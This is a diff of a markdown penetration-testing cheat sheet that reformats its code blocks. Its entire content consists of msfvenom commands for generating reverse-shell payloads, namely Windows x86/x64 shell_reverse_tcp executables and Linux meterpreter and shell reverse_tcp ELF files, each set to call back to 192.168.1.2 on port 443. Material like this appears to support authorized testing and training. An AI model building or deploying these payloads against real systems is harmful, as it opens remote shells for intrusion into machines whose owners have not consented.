@@ -140,20 +140,14 @@ x64 > ```msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -
 
 ### Shell (Netcat Listener)
 
-```
-32 bits > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+x86 > ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe```
 
-64 bits > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
-```
+x64 > ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe```
 
 ### Linux :
 
-```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf >reverse.elf
-```
+```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf >reverse.elf```
 
 ### or
 
-```
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf >reverse.elf
-```
+```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf >reverse.elf```
